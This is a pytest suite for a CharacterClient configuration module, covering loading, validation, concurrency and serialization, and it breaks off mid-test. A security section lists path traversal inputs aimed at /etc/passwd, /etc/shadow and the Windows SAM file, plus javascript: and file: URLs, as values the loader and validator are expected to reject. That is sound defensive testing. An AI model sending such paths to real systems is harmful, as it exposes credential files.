import pytest
import os
import tempfile
import json
import yaml
from unittest.mock import patch, mock_open, MagicMock
from pathlib import Path

# Import the config module being tested
try:
    from CharacterClient.config import Config, ConfigError, load_config, validate_config
except ImportError:
    # Handle case where config module structure might be different
    try:
        from CharacterClient import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)
    except ImportError:
        # Fallback for different import structures
        import sys
        sys.path.append('CharacterClient')
        import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)


class TestConfig:
    """Comprehensive test suite for Config functionality."""
    
    def setup_method(self):
        """Set up test fixtures before each test method."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.temp_dir, 'test_config.json')
        self.yaml_config_path = os.path.join(self.temp_dir, 'test_config.yaml')
        
        # Default valid configuration for testing
        self.valid_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False,
            'character_settings': {
                'default_name': 'TestCharacter',
                'max_characters': 100,
                'allowed_types': ['warrior', 'mage', 'rogue']
            }
        }
        
    def teardown_method(self):
        """Clean up after each test method."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_config_creation_with_valid_data(self):
        """Test Config object creation with valid configuration data."""
        if Config:
            config = Config(self.valid_config)
            assert config is not None
            assert hasattr(config, 'api_key') or 'api_key' in config
    
    def test_config_creation_with_empty_data(self):
        """Test Config object creation with empty configuration data."""
        if Config:
            with pytest.raises((ValueError, ConfigError, KeyError)):
                Config({})
    
    def test_config_creation_with_none(self):
        """Test Config object creation with None."""
        if Config:
            with pytest.raises((ValueError, ConfigError, TypeError)):
                Config(None)
    
    def test_config_creation_with_invalid_types(self):
        """Test Config object creation with invalid data types."""
        if Config:
            invalid_configs = [
                {'timeout': 'not_a_number'},
                {'max_retries': -1},
                {'debug': 'not_a_boolean'},
                {'character_settings': 'not_a_dict'}
            ]
            
            for invalid_config in invalid_configs:
                combined_config = {**self.valid_config, **invalid_config}
                with pytest.raises((ValueError, ConfigError, TypeError)):
                    Config(combined_config)
    
    def test_load_config_from_json_file(self):
        """Test loading configuration from a JSON file."""
        if load_config:
            # Create a test JSON config file
            with open(self.config_path, 'w') as f:
                json.dump(self.valid_config, f)
            
            config = load_config(self.config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_from_yaml_file(self):
        """Test loading configuration from a YAML file."""
        if load_config:
            # Create a test YAML config file
            with open(self.yaml_config_path, 'w') as f:
                yaml.dump(self.valid_config, f)
            
            config = load_config(self.yaml_config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_file_not_found(self):
        """Test loading configuration from non-existent file."""
        if load_config:
            with pytest.raises((FileNotFoundError, ConfigError, IOError)):
                load_config('/non/existent/path/config.json')
    
    def test_load_config_invalid_json(self):
        """Test loading configuration from invalid JSON file."""
        if load_config:
            # Create invalid JSON file
            with open(self.config_path, 'w') as f:
                f.write('{ invalid json content }')
            
            with pytest.raises((json.JSONDecodeError, ConfigError, ValueError)):
                load_config(self.config_path)
    
    def test_load_config_invalid_yaml(self):
        """Test loading configuration from invalid YAML file."""
        if load_config:
            # Create invalid YAML file
            with open(self.yaml_config_path, 'w') as f:
                f.write('invalid: yaml: content: [')
            
            with pytest.raises((yaml.YAMLError, ConfigError, ValueError)):
                load_config(self.yaml_config_path)
    
    def test_validate_config_with_valid_data(self):
        """Test configuration validation with valid data."""
        if validate_config:
            result = validate_config(self.valid_config)
            assert result is True or result is None  # Different implementations may return different values
    
    def test_validate_config_missing_required_fields(self):
        """Test configuration validation with missing required fields."""
        if validate_config:
            incomplete_configs = [
                {'api_key': 'test'},  # Missing other required fields
                {'base_url': 'https://api.example.com'},  # Missing api_key
                {}  # Empty config
            ]
            
            for incomplete_config in incomplete_configs:
                with pytest.raises((ValueError, ConfigError, KeyError)):
                    validate_config(incomplete_config)
    
    def test_validate_config_with_extra_fields(self):
        """Test configuration validation with extra unknown fields."""
        if validate_config:
            config_with_extra = {**self.valid_config, 'unknown_field': 'value'}
            # This should either pass (ignoring extra fields) or raise a specific error
            try:
                result = validate_config(config_with_extra)
                assert result is True or result is None
            except (ValueError, ConfigError):
                # Some implementations may reject unknown fields
                pass
    
    @patch.dict(os.environ, {'CHARACTER_API_KEY': 'env_api_key'})
    def test_config_from_environment_variables(self):
        """Test configuration loading from environment variables."""
        if Config:
            # Test that config can be loaded from environment variables
            env_config = {
                'api_key': os.environ.get('CHARACTER_API_KEY'),
                'base_url': 'https://api.example.com',
                'timeout': 30,
                'max_retries': 3,
                'debug': False,
                'character_settings': {}
            }
            
            config = Config(env_config)
            assert config is not None
    
    def test_config_default_values(self):
        """Test that configuration provides sensible default values."""
        if Config:
            minimal_config = {'api_key': 'test_key'}
            config = Config(minimal_config)
            
            # Test that defaults are applied appropriately
            # This test assumes the config system provides defaults
            assert config is not None
    
    def test_config_serialization(self):
        """Test configuration object serialization."""
        if Config:
            config = Config(self.valid_config)
            
            # Test various serialization methods that might exist
            try:
                serialized = str(config)
                assert serialized is not None
            except:
                pass
            
            try:
                dict_repr = dict(config) if hasattr(config, '__iter__') else vars(config)
                assert dict_repr is not None
            except:
                pass
    
    def test_config_immutability(self):
        """Test that configuration objects are immutable where expected."""
        if Config:
            config = Config(self.valid_config)
            
            # Try to modify the config and ensure it's protected
            try:
                if hasattr(config, 'api_key'):
                    original_key = config.api_key
                    config.api_key = 'modified_key'
                    # If modification succeeded, verify it was intended
                    assert config.api_key == 'modified_key' or config.api_key == original_key
            except (AttributeError, TypeError):
                # Expected if config is immutable
                pass
    
    def test_config_nested_access(self):
        """Test accessing nested configuration values."""
        if Config:
            config = Config(self.valid_config)
            
            # Test nested access patterns
            try:
                if hasattr(config, 'character_settings'):
                    assert config.character_settings is not None
                elif 'character_settings' in config:
                    assert config['character_settings'] is not None
            except (KeyError, AttributeError):
                # May not have nested access implemented
                pass
    
    def test_config_validation_edge_cases(self):
        """Test configuration validation with edge cases."""
        if validate_config:
            edge_cases = [
                {'api_key': ''},  # Empty string
                {'api_key': ' ' * 100},  # Very long string
                {'timeout': 0},  # Zero timeout
                {'timeout': 999999},  # Very large timeout
                {'max_retries': 0},  # Zero retries
                {'character_settings': {}},  # Empty nested dict
            ]
            
            for edge_case in edge_cases:
                test_config = {**self.valid_config, **edge_case}
                try:
                    validate_config(test_config)
                except (ValueError, ConfigError):
                    # Some edge cases may be invalid
                    pass
    
    def test_config_thread_safety(self):
        """Test configuration object thread safety."""
        if Config:
            import threading
            import time
            
            config = Config(self.valid_config)
            results = []
            
            def access_config():
                try:
                    # Access config properties multiple times
                    for _ in range(10):
                        if hasattr(config, 'api_key'):
                            val = config.api_key
                        elif 'api_key' in config:
                            val = config['api_key']
                        results.append(True)
                        time.sleep(0.001)  # Small delay
                except Exception as e:
                    results.append(False)
            
            # Create multiple threads accessing the config
            threads = [threading.Thread(target=access_config) for _ in range(5)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            
            # All accesses should succeed
            assert all(results)
    
    @patch('builtins.open', mock_open(read_data='{"api_key": "mocked_key"}'))
    def test_config_loading_with_mocked_file(self):
        """Test configuration loading with mocked file operations."""
        if load_config:
            config = load_config('mocked_path.json')
            assert config is not None
            assert config.get('api_key') == 'mocked_key'
    
    def test_config_error_handling(self):
        """Test proper error handling and error messages."""
        if ConfigError:
            # Test that ConfigError can be raised and caught
            with pytest.raises(ConfigError):
                raise ConfigError("Test error message")
    
    def test_config_backward_compatibility(self):
        """Test backward compatibility with older config formats."""
        if Config:
            # Test with minimal old-style config
            old_style_config = {
                'api_key': 'old_key',
                'url': 'https://old-api.example.com'  # Different key name
            }
            
            try:
                config = Config(old_style_config)
                assert config is not None
            except (ValueError, ConfigError, KeyError):
                # Expected if backward compatibility isn't maintained
                pass
    
    def test_config_performance(self):
        """Test configuration loading and access performance."""
        if Config:
            import time
            
            # Test config creation performance
            start_time = time.time()
            for _ in range(100):
                config = Config(self.valid_config)
            creation_time = time.time() - start_time
            
            # Should be reasonably fast (less than 1 second for 100 creations)
            assert creation_time < 1.0
            
            # Test config access performance
            config = Config(self.valid_config)
            start_time = time.time()
            for _ in range(1000):
                if hasattr(config, 'api_key'):
                    val = config.api_key
                elif 'api_key' in config:
                    val = config['api_key']
            access_time = time.time() - start_time
            
            # Should be very fast (less than 0.1 seconds for 1000 accesses)
            assert access_time < 0.1


class TestConfigIntegration:
    """Integration tests for Config functionality."""
    
    def test_config_with_real_file_system(self):
        """Test configuration with actual file system operations."""
        if load_config:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': 'integration_test_key'}, f)
                temp_path = f.name
            
            try:
                config = load_config(temp_path)
                assert config is not None
                assert config.get('api_key') == 'integration_test_key'
            finally:
                os.unlink(temp_path)
    
    def test_config_with_environment_integration(self):
        """Test configuration integration with environment variables."""
        if Config:
            # Test environment variable precedence
            with patch.dict(os.environ, {'CONFIG_DEBUG': 'true'}):
                config_data = {'api_key': 'test', 'debug': False}
                config = Config(config_data)
                # Test if environment variables override config file values
                assert config is not None


class TestConfigSecurity:
    """Security-focused tests for configuration handling."""
    
    def test_config_sensitive_data_handling(self):
        """Test that sensitive configuration data is handled securely."""
        if Config:
            sensitive_config = {
                'api_key': 'super_secret_key',
                'password': 'secret_password',
                'token': 'auth_token_123'
            }
            
            config = Config(sensitive_config)
            
            # Test that sensitive data doesn't appear in string representations
            config_str = str(config)
            assert 'super_secret_key' not in config_str
            assert 'secret_password' not in config_str
    
    def test_config_path_traversal_protection(self):
        """Test protection against path traversal attacks in config file loading."""
        if load_config:
            malicious_paths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM'
            ]
            
            for malicious_path in malicious_paths:
                with pytest.raises((FileNotFoundError, PermissionError, ValueError, ConfigError)):
                    load_config(malicious_path)


class TestConfigValidation:
    """Comprehensive validation tests for configuration data."""
    
    def test_url_validation(self):
        """Test URL validation in configuration."""
        if validate_config or Config:
            invalid_urls = [
                'not_a_url',
                'http://',
                'ftp://invalid',
                'javascript:alert(1)',
                'file:///etc/passwd'
            ]
            
            for invalid_url in invalid_urls:
                invalid_config = {'api_key': 'test', 'base_url': invalid_url}
                
                if validate_config:
                    with pytest.raises((ValueError, ConfigError)):
                        validate_config(invalid_config)
                elif Config:
                    with pytest.raises((ValueError, ConfigError)):
                        Config(invalid_config)
    
    def test_numeric_range_validation(self):
        """Test numeric range validation for configuration values."""
        if validate_config or Config:
            test_cases = [
                ('timeout', -1, False),  # Negative timeout should be invalid
                ('timeout', 0, False),   # Zero timeout should be invalid
                ('timeout', 1, True),    # Positive timeout should be valid
                ('max_retries', -1, False),  # Negative retries should be invalid
                ('max_retries', 0, True),    # Zero retries might be valid
                ('max_retries', 100, True),  # Large retries should be valid
            ]
            
            base_config = {'api_key': 'test', 'base_url': 'https://api.example.com'}
            
            for field, value, should_be_valid in test_cases:
                test_config = {**base_config, field: value}
                
                if should_be_valid:
                    try:
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)
                    except (ValueError, ConfigError):
                        pytest.fail(f"Valid {field}={value} was rejected")
                else:
                    with pytest.raises((ValueError, ConfigError)):
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)


# Additional parametrized tests for comprehensive coverage
@pytest.mark.parametrize("config_format", ["json", "yaml"])
def test_config_loading_different_formats(config_format):
    """Test configuration loading with different file formats."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    config_data = {'api_key': 'format_test_key'}
    
    with tempfile.NamedTemporaryFile(mode='w', suffix=f'.{config_format}', delete=False) as f:
        if config_format == 'json':
            json.dump(config_data, f)
        elif config_format == 'yaml':
            yaml.dump(config_data, f)
        temp_path = f.name
    
    try:
        config = load_config(temp_path)
        assert config is not None
        assert config.get('api_key') == 'format_test_key'
    finally:
        os.unlink(temp_path)


@pytest.mark.parametrize("invalid_value", [None, "", "   ", 123, [], {}])
def test_config_validation_invalid_api_keys(invalid_value):
    """Test configuration validation with various invalid API key values."""
    if not validate_config:
        pytest.skip("validate_config function not available")
    
    config_data = {
        'api_key': invalid_value,
        'base_url': 'https://api.example.com'
    }
    
    with pytest.raises((ValueError, ConfigError, TypeError)):
        validate_config(config_data)


@pytest.mark.parametrize("timeout_value", [-1, 0, 1, 30, 300, 999999])
def test_config_timeout_boundary_values(timeout_value):
    """Test configuration with various timeout boundary values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'timeout': timeout_value
    }
    
    if timeout_value < 1:
        with pytest.raises((ValueError, ConfigError)):
            Config(config_data)
    else:
        config = Config(config_data)
        assert config is not None


@pytest.mark.parametrize("debug_value", [True, False, "true", "false", 1, 0, "yes", "no"])
def test_config_debug_flag_values(debug_value):
    """Test configuration with various debug flag values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'debug': debug_value
    }
    
    try:
        config = Config(config_data)
        assert config is not None
    except (ValueError, ConfigError, TypeError):
        # Some debug values might be invalid depending on implementation
        pass


class TestConfigConcurrency:
    """Tests for configuration handling under concurrent access."""
    
    def test_config_multiple_readers(self):
        """Test configuration with multiple concurrent readers."""
        if not Config:
            pytest.skip("Config class not available")
        
        import threading
        import time
        
        config_data = {'api_key': 'concurrent_test_key'}
        config = Config(config_data)
        
        results = []
        errors = []
        
        def read_config():
            try:
                for _ in range(50):
                    if hasattr(config, 'api_key'):
                        value = config.api_key
                    elif 'api_key' in config:
                        value = config['api_key']
                    results.append(value)
                    time.sleep(0.001)
            except Exception as e:
                errors.append(e)
        
        # Create multiple reader threads
        threads = [threading.Thread(target=read_config) for _ in range(10)]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All reads should succeed without errors
        assert len(errors) == 0
        assert len(results) > 0
    
    def test_config_loading_concurrent_files(self):
        """Test loading configuration from multiple files concurrently."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import threading
        
        # Create multiple temporary config files
        temp_files = []
        for i in range(5):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': f'test_key_{i}'}, f)
                temp_files.append(f.name)
        
        results = []
        errors = []
        
        def load_config_file(filepath):
            try:
                config = load_config(filepath)
                results.append(config)
            except Exception as e:
                errors.append(e)
        
        # Load configs concurrently
        threads = [threading.Thread(target=load_config_file, args=(path,)) for path in temp_files]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Clean up temporary files
        for temp_file in temp_files:
            os.unlink(temp_file)
        
        # All loads should succeed
        assert len(errors) == 0
        assert len(results) == 5


# Edge case tests for robustness
class TestConfigEdgeCases:
    """Edge case tests for configuration handling."""
    
    def test_config_with_unicode_values(self):
        """Test configuration with Unicode values."""
        if not Config:
            pytest.skip("Config class not available")
        
        unicode_config = {
            'api_key': 'тест_ключ_🔑',
            'base_url': 'https://测试.example.com',
            'debug': False
        }
        
        config = Config(unicode_config)
        assert config is not None
    
    def test_config_with_very_long_values(self):
        """Test configuration with very long string values."""
        if not Config:
            pytest.skip("Config class not available")
        
        long_string = 'x' * 10000
        long_config = {
            'api_key': long_string,
            'base_url': 'https://api.example.com'
        }
        
        try:
            config = Config(long_config)
            assert config is not None
        except (ValueError, ConfigError, MemoryError):
            # Some implementations may reject very long values
            pass
    
    def test_config_with_deeply_nested_data(self):
        """Test configuration with deeply nested data structures."""
        if not Config:
            pytest.skip("Config class not available")
        
        nested_config = {
            'api_key': 'test_key',
            'level1': {
                'level2': {
                    'level3': {
                        'level4': {
                            'level5': {
                                'deep_value': 'found_me'
                            }
                        }
                    }
                }
            }
        }
        
        config = Config(nested_config)
        assert config is not None
    
    def test_config_with_circular_references(self):
        """Test configuration handling with circular references."""
        if not Config:
            pytest.skip("Config class not available")
        
        # Create a structure with circular reference
        circular_dict = {'api_key': 'test_key'}
        circular_dict['self_ref'] = circular_dict
        
        with pytest.raises((ValueError, ConfigError, RecursionError)):
            Config(circular_dict)


# Performance benchmarks
class TestConfigPerformance:
    """Performance tests for configuration operations."""
    
    def test_config_creation_performance_benchmark(self):
        """Benchmark configuration object creation performance."""
        if not Config:
            pytest.skip("Config class not available")
        
        import time
        
        config_data = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
        
        # Warm up
        for _ in range(10):
            Config(config_data)
        
        # Benchmark
        start_time = time.time()
        iterations = 1000
        
        for _ in range(iterations):
            Config(config_data)
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_time = total_time / iterations
        
        # Should create configs quickly (less than 1ms per config on average)
        assert avg_time < 0.001, f"Config creation too slow: {avg_time:.4f}s per config"
    
    def test_config_file_loading_performance(self):
        """Benchmark configuration file loading performance."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import time
        
        # Create a reasonably sized config file
        large_config = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'settings': {f'setting_{i}': f'value_{i}' for i in range(100)}
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(large_config, f)
            temp_path = f.name
        
        try:
            # Warm up
            for _ in range(5):
                load_config(temp_path)
            
            # Benchmark
            start_time = time.time()
            iterations = 100
            
            for _ in range(iterations):
                load_config(temp_path)
            
            end_time = time.time()
            total_time = end_time - start_time
            avg_time = total_time / iterations
            
            # Should load configs quickly (less than 10ms per load on average)
            assert avg_time < 0.01, f"Config loading too slow: {avg_time:.4f}s per load"
        
        finally:
            os.unlink(temp_path)

class TestConfigAdvancedValidation:
    """Advanced validation tests for configuration edge cases."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.base_config = {
            'api_key': 'test_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
    
    def test_config_with_special_characters_in_keys(self):
        """Test configuration with special characters in keys."""
        if Config:
            special_char_config = {
                'api-key': 'test_key',
                'base_url@domain': 'https://api.example.com',
                'timeout#value': 30,
                'max.retries': 3,
                'debug_flag': False
            }
            
            try:
                config = Config(special_char_config)
                assert config is not None
            except (ValueError, ConfigError, KeyError):
                # Some implementations may not support special characters in keys
                pass
    
    def test_config_with_numeric_string_values(self):
        """Test configuration with numeric values as strings."""
        if Config:
            numeric_string_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'timeout': '30',  # String instead of int
                'max_retries': '3',  # String instead of int
                'debug': 'false'  # String instead of boolean
            }
            
            try:
                config = Config(numeric_string_config)
                assert config is not None
                # Test if values are automatically converted
                if hasattr(config, 'timeout'):
                    assert isinstance(config.timeout, (int, str))
            except (ValueError, ConfigError, TypeError):
                # Some implementations may require strict typing
                pass
    
    def test_config_with_null_values(self):
        """Test configuration with null/None values."""
        if Config:
            null_config = {
                'api_key': 'test_key',
                'base_url': None,
                'timeout': None,
                'max_retries': None,
                'debug': None
            }
            
            with pytest.raises((ValueError, ConfigError, TypeError)):
                Config(null_config)
    
    def test_config_with_mixed_case_keys(self):
        """Test configuration with mixed case keys."""
        if Config:
            mixed_case_config = {
                'API_KEY': 'test_key',
                'Base_URL': 'https://api.example.com',
                'TimeOut': 30,
                'maxRetries': 3,
                'DEBUG': False
            }
            
            try:
                config = Config(mixed_case_config)
                assert config is not None
            except (ValueError, ConfigError, KeyError):
                # Key case sensitivity may vary by implementation
                pass
    
    def test_config_with_duplicate_keys_different_case(self):
        """Test configuration behavior with duplicate keys in different cases."""
        if Config:
            # This test is more about understanding behavior than expecting specific results
            duplicate_case_config = {
                'api_key': 'lowercase_key',
                'API_KEY': 'uppercase_key',
                'Api_Key': 'mixed_case_key',
                'base_url': 'https://api.example.com'
            }
            
            try:
                config = Config(duplicate_case_config)
                # Behavior may vary - last key wins, error, or merge
                assert config is not None
            except (ValueError, ConfigError):
                # Some implementations may detect key conflicts
                pass
    
    def test_config_with_boolean_string_variations(self):
        """Test configuration with various boolean string representations."""
        if Config:
            boolean_variations = [
                ('true', True), ('false', False), ('True', True), ('False', False),
                ('TRUE', True), ('FALSE', False), ('yes', True), ('no', False),
                ('1', True), ('0', False), ('on', True), ('off', False)
            ]
            
            for bool_str, expected in boolean_variations:
                test_config = {
                    'api_key': 'test_key',
                    'base_url': 'https://api.example.com',
                    'debug': bool_str
                }
                
                try:
                    config = Config(test_config)
                    assert config is not None
                    # Test if boolean conversion works as expected
                    if hasattr(config, 'debug'):
                        debug_val = config.debug
                        # Value should be converted to boolean or remain as string
                        assert isinstance(debug_val, (bool, str))
                except (ValueError, ConfigError, TypeError):
                    # Some boolean string formats may not be supported
                    pass
    
    def test_config_with_array_values(self):
        """Test configuration with array/list values."""
        if Config:
            array_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'allowed_methods': ['GET', 'POST', 'PUT', 'DELETE'],
                'supported_formats': ['json', 'xml', 'yaml'],
                'retry_codes': [500, 502, 503, 504],
                'feature_flags': [True, False, True]
            }
            
            config = Config(array_config)
            assert config is not None
    
    def test_config_with_empty_arrays(self):
        """Test configuration with empty array values."""
        if Config:
            empty_array_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'allowed_methods': [],
                'supported_formats': [],
                'retry_codes': []
            }
            
            config = Config(empty_array_config)
            assert config is not None
    
    def test_config_with_numeric_edge_values(self):
        """Test configuration with numeric edge case values."""
        if Config:
            import sys
            
            numeric_edge_cases = [
                ('timeout', sys.maxsize),
                ('timeout', -sys.maxsize),
                ('max_retries', 0),
                ('max_retries', 1000000),
                ('port', 65535),
                ('port', 1),
                ('weight', 0.0),
                ('weight', 1.0),
                ('ratio', -1.0)
            ]
            
            for field, value in numeric_edge_cases:
                test_config = {
                    'api_key': 'test_key',
                    'base_url': 'https://api.example.com',
                    field: value
                }
                
                try:
                    config = Config(test_config)
                    assert config is not None
                except (ValueError, ConfigError, OverflowError):
                    # Some extreme values may be rejected
                    pass


class TestConfigErrorMessages:
    """Test detailed error messages and error handling."""
    
    def test_config_validation_error_messages(self):
        """Test that validation errors contain helpful messages."""
        if validate_config:
            invalid_configs = [
                ({}, "empty configuration"),
                ({'api_key': ''}, "empty API key"),
                ({'api_key': 'test', 'timeout': -1}, "negative timeout"),
                ({'api_key': 'test', 'base_url': 'invalid_url'}, "invalid URL")
            ]
            
            for invalid_config, description in invalid_configs:
                try:
                    validate_config(invalid_config)
                    pytest.fail(f"Should have failed for {description}")
                except (ValueError, ConfigError) as e:
                    # Error message should be informative
                    error_msg = str(e).lower()
                    assert len(error_msg) > 0
                    # Could check for specific error message content
    
    def test_config_creation_error_context(self):
        """Test that config creation errors provide context."""
        if Config:
            with pytest.raises((ValueError, ConfigError)) as exc_info:
                Config({'api_key': None})
            
            error_msg = str(exc_info.value)
            assert len(error_msg) > 0
            # Error should mention the problematic field
    
    def test_config_file_loading_error_details(self):
        """Test detailed error messages for file loading failures."""
        if load_config:
            # Test with non-existent file
            try:
                load_config('/path/does/not/exist.json')
            except (FileNotFoundError, ConfigError, IOError) as e:
                error_msg = str(e)
                assert 'exist' in error_msg.lower() or 'found' in error_msg.lower()
            
            # Test with invalid JSON
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                f.write('{ invalid json }')
                temp_path = f.name
            
            try:
                try:
                    load_config(temp_path)
                except (json.JSONDecodeError, ConfigError, ValueError) as e:
                    error_msg = str(e)
                    assert len(error_msg) > 0
                    # Should indicate JSON parsing issue
            finally:
                os.unlink(temp_path)


class TestConfigMemoryManagement:
    """Test memory management and resource cleanup."""
    
    def test_config_memory_usage(self):
        """Test that config objects don't consume excessive memory."""
        if Config:
            import gc
            import sys
            
            # Create many config objects
            configs = []
            for i in range(1000):
                config_data = {
                    'api_key': f'test_key_{i}',
                    'base_url': f'https://api{i}.example.com',
                    'timeout': 30 + i,
                    'max_retries': 3,
                    'debug': i % 2 == 0
                }
                configs.append(Config(config_data))
            
            # Force garbage collection
            gc.collect()
            
            # Memory usage should be reasonable
            # This is more of a smoke test than a strict assertion
            assert len(configs) == 1000
            
            # Clean up
            del configs
            gc.collect()
    
    def test_config_object_lifecycle(self):
        """Test config object creation and destruction."""
        if Config:
            import weakref
            
            config_data = {'api_key': 'test_key'}
            config = Config(config_data)
            
            # Create weak reference to track object lifecycle
            weak_ref = weakref.ref(config)
            assert weak_ref() is not None
            
            # Delete the config object
            del config
            
            # Force garbage collection
            import gc
            gc.collect()
            
            # Object should be garbage collected (implementation dependent)
            # This is informational rather than strictly enforced


class TestConfigCompatibility:
    """Test compatibility across different scenarios."""
    
    def test_config_python_version_compatibility(self):
        """Test config behavior across Python version differences."""
        if Config:
            import sys
            
            # Test dictionary ordering (Python 3.7+ guarantees order)
            config_data = {
                'z_key': 'last',
                'a_key': 'first',
                'm_key': 'middle'
            }
            
            config = Config(config_data)
            assert config is not None
            
            # Test that config works regardless of insertion order
    
    def test_config_with_pathlib_paths(self):
        """Test config with pathlib.Path objects."""
        if load_config:
            from pathlib import Path
            
            # Create temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': 'pathlib_test'}, f)
                temp_path = f.name
            
            try:
                # Test with pathlib.Path object
                path_obj = Path(temp_path)
                config = load_config(path_obj)
                assert config is not None
                assert config.get('api_key') == 'pathlib_test'
            except TypeError:
                # Some implementations may not support pathlib.Path
                pass
            finally:
                os.unlink(temp_path)
    
    def test_config_with_bytes_values(self):
        """Test config behavior with bytes values."""
        if Config:
            bytes_config = {
                'api_key': b'test_key_bytes',
                'base_url': 'https://api.example.com'
            }
            
            try:
                config = Config(bytes_config)
                assert config is not None
            except (ValueError, ConfigError, TypeError):
                # Bytes values may not be supported
                pass


class TestConfigLogging:
    """Test configuration logging and debugging features."""
    
    def test_config_debug_logging(self):
        """Test config debug logging when enabled."""
        if Config:
            import logging
            from unittest.mock import patch
            
            debug_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'debug': True
            }
            
            with patch('logging.Logger.debug') as mock_debug:
                config = Config(debug_config)
                assert config is not None
                # Debug logging may or may not have been called
                # This is more of a smoke test
    
    def test_config_warning_for_deprecated_fields(self):
        """Test warnings for deprecated configuration fields."""
        if Config:
            import warnings
            
            deprecated_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'old_field': 'deprecated_value',  # Potentially deprecated
                'legacy_setting': True
            }
            
            with warnings.catch_warnings(record=True) as w:
                warnings.simplefilter("always")
                config = Config(deprecated_config)
                assert config is not None
                # Warnings may or may not be issued depending on implementation


class TestConfigSerialization:
    """Test configuration serialization and deserialization."""
    
    def test_config_to_dict_conversion(self):
        """Test converting config objects back to dictionaries."""
        if Config:
            original_data = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'timeout': 30,
                'debug': False
            }
            
            config = Config(original_data)
            
            # Try different ways to convert back to dict
            try:
                if hasattr(config, 'to_dict'):
                    result_dict = config.to_dict()
                    assert isinstance(result_dict, dict)
                    assert 'api_key' in result_dict
                elif hasattr(config, '__dict__'):
                    result_dict = config.__dict__
                    assert isinstance(result_dict, dict)
                else:
                    # Try to iterate over config as dict-like object
                    result_dict = dict(config)
                    assert isinstance(result_dict, dict)
            except (AttributeError, TypeError):
                # Serialization methods may not be implemented
                pass
    
    def test_config_json_serialization(self):
        """Test JSON serialization of config objects."""
        if Config:
            original_data = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'timeout': 30
            }
            
            config = Config(original_data)
            
            try:
                # Test if config can be JSON serialized
                json_str = json.dumps(config, default=str)
                assert isinstance(json_str, str)
                assert len(json_str) > 0
            except (TypeError, ValueError):
                # Direct JSON serialization may not be supported
                pass
    
    def test_config_copy_behavior(self):
        """Test config object copying behavior."""
        if Config:
            import copy
            
            original_data = {
                'api_key': 'test_key',
                'nested': {'value': 'test'}
            }
            
            config = Config(original_data)
            
            try:
                # Test shallow copy
                shallow_copy = copy.copy(config)
                assert shallow_copy is not None
                assert shallow_copy is not config
                
                # Test deep copy
                deep_copy = copy.deepcopy(config)
                assert deep_copy is not None
                assert deep_copy is not config
            except (TypeError, AttributeError):
                # Copying may not be supported for all config implementations
                pass


class TestConfigNetworking:
    """Test configuration for network-related settings."""
    
    def test_config_url_variations(self):
        """Test various URL formats and protocols."""
        if Config:
            url_variations = [
                'https://api.example.com',
                'http://localhost:8080',
                'https://api.example.com:443/v1',
                'http://127.0.0.1:3000/api',
                'https://subdomain.api.example.com/v2/endpoint'
            ]
            
            for url in url_variations:
                config_data = {
                    'api_key': 'test_key',
                    'base_url': url
                }
                
                try:
                    config = Config(config_data)
                    assert config is not None
                except (ValueError, ConfigError):
                    # Some URL formats may be rejected
                    pass
    
    def test_config_port_ranges(self):
        """Test configuration with various port numbers."""
        if Config:
            port_test_cases = [
                (80, True),    # Standard HTTP
                (443, True),   # Standard HTTPS  
                (8080, True),  # Common alternative
                (3000, True),  # Development port
                (65535, True), # Maximum port
                (0, False),    # Invalid port
                (-1, False),   # Invalid port
                (65536, False) # Above maximum
            ]
            
            for port, should_be_valid in port_test_cases:
                config_data = {
                    'api_key': 'test_key',
                    'base_url': 'https://api.example.com',
                    'port': port
                }
                
                if should_be_valid:
                    try:
                        config = Config(config_data)
                        assert config is not None
